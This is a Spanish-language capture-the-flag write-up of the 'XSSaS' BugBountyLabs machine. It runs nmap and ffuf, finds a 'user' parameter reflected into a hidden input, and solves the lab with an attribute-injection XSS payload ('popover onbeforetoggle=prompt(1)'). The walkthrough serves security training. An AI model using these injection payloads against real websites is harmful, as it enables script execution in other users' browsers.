---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# XSSaS BugBountyLabs (Experto)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-19 03:37 EDT
Nmap scan report for 192.168.1.149
Host is up (0.00036s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp open  http    Werkzeug/2.2.2 Python/3.11.2
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
|_http-title: Verificaci\xC3\xB3n de Usuario
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Wed, 19 Mar 2025 07:37:42 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 549
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="es">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Verificaci
|     Usuario</title>
|     </head>
|     <body>
|     <h1>Usuario no encontrado</h1>
|     <button id=y popovertarget=x>Click Here</button>
|     <form><input type="hidden" value=""></form>
|     <footer>
|     <hr>
|     <p>Powered by <strong>archyxsec</strong></p>
|     </footer>
|     <script>
|     Simulate a click :)
|     document.getElementById("y").click();
|     </script>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Wed, 19 Mar 2025 07:37:42 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=3/19%Time=67DA7445%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,2D3,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\x2
SF:0Python/3\.11\.2\r\nDate:\x20Wed,\x2019\x20Mar\x202025\x2007:37:42\x20G
SF:MT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x
SF:20549\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=
SF:\"es\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20\
SF:x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20i
SF:nitial-scale=1\.0\">\n\x20\x20\x20\x20<title>Verificaci\xc3\xb3n\x20de\
SF:x20Usuario</title>\n</head>\n<body>\n\x20\x20\x20\x20<h1>Usuario\x20no\
SF:x20encontrado</h1>\n\x20\x20\x20\x20<button\x20id=y\x20popovertarget=x>
SF:Click\x20Here</button>\n\x20\x20\x20\x20<form><input\x20type=\"hidden\"
SF:\x20value=\"\"></form>\n\x20\x20\x20\x20<footer>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20<hr>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Powered\x20by\x20<s
SF:trong>archyxsec</strong></p>\n\x20\x20\x20\x20</footer>\n\x20\x20\x20\x
SF:20<script>\n\x20\x20\x20\x20\x20\x20\x20\x20//\x20Simulate\x20a\x20clic
SF:k\x20:\)\n\x20\x20\x20\x20\x20\x20\x20\x20document\.getElementById\(\"y
SF:\"\)\.click\(\);\n\x20\x20\x20\x20</script>\n</body>\n</html>")%r(HTTPO
SF:ptions,C7,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\x20Pyt
SF:hon/3\.11\.2\r\nDate:\x20Wed,\x2019\x20Mar\x202025\x2007:37:42\x20GMT\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20HEAD,\x20OP
SF:TIONS,\x20GET\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")
SF:%r(RTSPRequest,16C,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20
SF:\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"utf-
SF:8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\
SF:n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Messag
SF:e:\x20Bad\x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20400\x20-\x20Bad\
SF:x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20
SF:\x20</body>\n</html>\n");
MAC Address: 08:00:27:9C:CF:BC (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.97 seconds
```

Vemos que hay un `SSH` y un puerto `80`, si entramos en la pagina web del puerto `80` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (305).png" alt=""><figcaption></figcaption></figure>

Ya de primeras podemos intuir que tiene que ver con algun parametro o algo que pueda estar detectando el si somos un usuario o no, si investigamos un poco veremos que nos esta pidiendo un usuario, pero si inspeccionamos la pagina veremos esta linea bastante interesante:

```html
<form><input type="hidden" value=""></form>
```

Esta escondido a nivel de pagina y el valor esta vacio, si por ejemplo probamos con poner `?user=` como parametro en la `URL` veremos lo siguiente:

```
URL = http://<IP>/?user=test
```

Info:

```html
<form><input type="hidden" value="test"></form>
```

Vemos que el valor se esta rellenando de forma correcta, pero igualmente tambien se puede hacer con un poco de `fuzzing`.

## FFUF

```shell
ffuf -u http://<IP>/\?FUZZ\=test -w <WORDLIST> -fs 549
```

Info:

```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.1.149/?FUZZ=test
 :: Wordlist         : FUZZ: /home/kali/Downloads/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 549
________________________________________________

user                    [Status: 200, Size: 553, Words: 94, Lines: 21, Duration: 47ms]
:: Progress: [6453/6453] :: Job [1/1] :: 884 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

Vemos que nos lo encontro de forma correcta, ahora vamos a probar a realizar un `XSS` en dicho parametro, que es de lo que se trata esta maquina.

```
URL = http://<IP>/?user="><script>alert('XSS')</script>
```

Pero nos respondera lo siguiente:

<figure><img src="../../.gitbook/assets/image (306).png" alt=""><figcaption></figcaption></figure>

Pero si intentamos un `Bypass` no nos dejara, si investigamos vemos este parametro de aqui:

<figure><img src="../../.gitbook/assets/image (307).png" alt=""><figcaption></figcaption></figure>

Y si buscamos que es nos vamos a encontrar con lo siguiente:

URL = [Info popovertarget](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags)

Vemos que utiliza un `payload` en concreto para realizar el `XSS` con dicho parametro o atributo, por lo que nuestro `payload` tiene que quedar de la siguiente forma:

```
"id=x popover onbeforetoggle="prompt(1)
```

Ahora si ejecutamos esto de la siguiente forma:

```
URL = http://<IP>/?user="id=x popover onbeforetoggle="prompt(1)
```

Veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (308).png" alt=""><figcaption></figcaption></figure>

Vemos que ha funcionado de forma correcta, por lo que habremos terminado la maquina.
